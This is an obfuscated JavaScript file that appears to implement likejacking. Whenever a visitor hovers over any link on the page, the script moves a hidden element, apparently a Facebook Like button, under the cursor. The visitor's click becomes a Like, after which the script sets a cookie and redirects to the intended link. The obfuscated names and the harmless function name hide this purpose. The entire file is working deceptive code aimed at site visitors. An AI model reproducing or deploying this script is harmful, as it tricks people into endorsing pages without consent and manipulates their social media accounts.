function loggedinfunction() {
    window['yestheylikeme'] = 1;
    var _0x4f1cx2 = jQuery['noConflict']();

    function _0x4f1cx3(_0x4f1cx4) {
        var _0x4f1cx5 = 0;
        var _0x4f1cx6;
        _0x4f1cx2('*', _0x4f1cx4)['each'](function () {
            if (_0x4f1cx2(this)['outerHeight'](true) > _0x4f1cx5) {
                _0x4f1cx6 = _0x4f1cx2(this);
                _0x4f1cx5 = _0x4f1cx6['outerHeight'](true);
            };
        });
        if (_0x4f1cx4['outerHeight'](true) > _0x4f1cx5) {
            _0x4f1cx5 = _0x4f1cx4['outerHeight'](true);
        };
        return _0x4f1cx5 + 3;
    };

    function _0x4f1cx7(_0x4f1cx4) {
        var _0x4f1cx5 = _0x4f1cx4['offset']()['top'];
        var _0x4f1cx6;
        _0x4f1cx2('*', _0x4f1cx4)['each'](function () {
            if (_0x4f1cx2(this)['offset']()['top'] < _0x4f1cx5) {
                _0x4f1cx6 = _0x4f1cx2(this);
                _0x4f1cx5 = _0x4f1cx6['offset']()['top'];
            };
        });
        if (_0x4f1cx4['offset']()['top'] < _0x4f1cx5) {
            _0x4f1cx5 = _0x4f1cx4['offset']()['top'];
        };
        return _0x4f1cx5 + 3;
    };
    _0x4f1cx2(document)['ready'](function () {
        var _0x4f1cx8 = 0;
        var _0x4f1cx9 = 0;
        var _0x4f1cxa = '';
        var _0x4f1cxb = 0;
        




        
        window['yestheylikeme'] = 1;
        if (_0x4f1cx2['cookie']('theylikeme_' + escape(document['domain'])) == 1) {
            _0x4f1cxb = 1;
            window['yestheylikeme'] = 0;
        };
        if (window['yestheylikeme']) {
            FB['Event']['subscribe']('edge.create', function (_0x4f1cxc) {
                _0x4f1cx2('#theylikeme')['css']('display', 'none');
                _0x4f1cxb = 1;
                _0x4f1cx2['cookie']('theylikeme_' + escape(document['domain']), '1');
                window['location']['href'] = _0x4f1cxa['attr']('href');
            });
            _0x4f1cx2(document)['mousemove'](function (_0x4f1cxd) {
                if (_0x4f1cxa != '') {
                    if (_0x4f1cxd['pageY'] < (_0x4f1cx7(_0x4f1cxa) - 4) || _0x4f1cxd['pageY'] > (_0x4f1cx7(_0x4f1cxa) + _0x4f1cx3(_0x4f1cxa)) || _0x4f1cxd['pageX'] < _0x4f1cxa['offset']()['left'] || _0x4f1cxd['pageX'] > (_0x4f1cxa['offset']()['left'] + _0x4f1cxa['width']())) {
                        _0x4f1cxa = '';
                        _0x4f1cx2('#theylikeme')['css']('display', 'none');
                    } else {
                        if (_0x4f1cx2['browser']['msie']) {
                            _0x4f1cx2('#theylikeme')['css']('top', (_0x4f1cxd['pageY'] - 15) + 'px');
                            _0x4f1cx2('#theylikeme')['css']('left', (_0x4f1cxd['pageX'] - 20) + 'px');
                        } else {
                            _0x4f1cx2('#theylikeme')['css']('top', (_0x4f1cxd['pageY'] - 5) + 'px');
                            _0x4f1cx2('#theylikeme')['css']('left', (_0x4f1cxd['pageX'] - 20) + 'px');
                        };
                    };
                };
            });
            _0x4f1cx2(document)['delegate']('a', 'mouseenter', function () {
                if (_0x4f1cxb == 0) {
                    _0x4f1cxa = _0x4f1cx2(this);
                    _0x4f1cx2('#theylikeme')['css']('display', 'block');
                };
            });
        };
    });
    jQuery['cookie'] = function (_0x4f1cxe, _0x4f1cxf, _0x4f1cx10) {
        if (typeof _0x4f1cxf != 'undefined') {
            _0x4f1cx10 = _0x4f1cx10 || {};
            if (_0x4f1cxf === null) {
                _0x4f1cxf = '';
                _0x4f1cx10['expires'] = -1;
            };
            var _0x4f1cx11 = '';
            if (_0x4f1cx10['expires'] && (typeof _0x4f1cx10['expires'] == 'number' || _0x4f1cx10['expires']['toUTCString'])) {
                var _0x4f1cx12;
                if (typeof _0x4f1cx10['expires'] == 'number') {
                    _0x4f1cx12 = new Date();
                    _0x4f1cx12['setTime'](_0x4f1cx12['getTime']() + (_0x4f1cx10['expires'] * 24 * 60 * 60 * 1000));
                } else {
                    _0x4f1cx12 = _0x4f1cx10['expires'];
                };
                _0x4f1cx11 = '; expires=' + _0x4f1cx12['toUTCString']();
            };
            var _0x4f1cx13 = _0x4f1cx10['path'] ? '; path=' + (_0x4f1cx10['path']) : '';
            var _0x4f1cx14 = _0x4f1cx10['domain'] ? '; domain=' + (_0x4f1cx10['domain']) : '';
            var _0x4f1cx15 = _0x4f1cx10['secure'] ? '; secure' : '';
            document['cookie'] = [_0x4f1cxe, '=', encodeURIComponent(_0x4f1cxf), _0x4f1cx11, _0x4f1cx13, _0x4f1cx14, _0x4f1cx15]['join']('');
        } else {
            var _0x4f1cx16 = null;
            if (document['cookie'] && document['cookie'] != '') {
                var _0x4f1cx17 = document['cookie']['split'](';');
                for (var _0x4f1cx18 = 0; _0x4f1cx18 < _0x4f1cx17['length']; _0x4f1cx18++) {
                    var _0x4f1cx19 = jQuery['trim'](_0x4f1cx17[_0x4f1cx18]);
                    if (_0x4f1cx19['substring'](0, _0x4f1cxe['length'] + 1) == (_0x4f1cxe + '=')) {
                        _0x4f1cx16 = decodeURIComponent(_0x4f1cx19['substring'](_0x4f1cxe['length'] + 1));
                        break;
                    };
                };
            };
            return _0x4f1cx16;
        };
    };
};